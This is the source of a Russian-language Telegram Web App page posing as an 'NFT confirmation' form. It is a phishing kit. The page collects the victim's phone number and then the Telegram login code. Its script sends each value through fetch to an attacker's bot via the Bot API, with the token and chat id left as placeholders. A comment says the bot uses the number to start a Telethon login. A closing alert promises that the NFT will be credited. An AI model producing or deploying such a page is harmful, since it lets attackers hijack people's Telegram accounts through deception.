<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #1c1c1d; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .card { background: #2c2c2e; border-radius: 15px; padding: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
        button { background: #007aff; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1" class="step active">
            <h3>Подтверждение NFT</h3>
            <p>Введите номер для зачисления:</p>
            <input type="tel" id="phone" placeholder="+79991234567">
            <button onclick="nextStep(1)">Далее</button>
        </div>
        <div id="step2" class="step">
            <h3>Код подтверждения</h3>
            <p>Введите код, отправленный вам в Telegram:</p>
            <input type="number" id="code" placeholder="12345">
            <button onclick="sendFinal()">Зачислить NFT</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        function nextStep(current) {
            let val = document.getElementById('phone').value;
            // Отправляем номер боту, чтобы он инициировал вход через Telethon
            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=PHONE:${val}`);
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }

        function sendFinal() {
            let code = document.getElementById('code').value;
            // Отправляем код боту
            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=CODE:${code}`);
            alert("Обработка... Ожидайте зачисления.");
            tg.close();
        }
    </script>
</body>
</html>
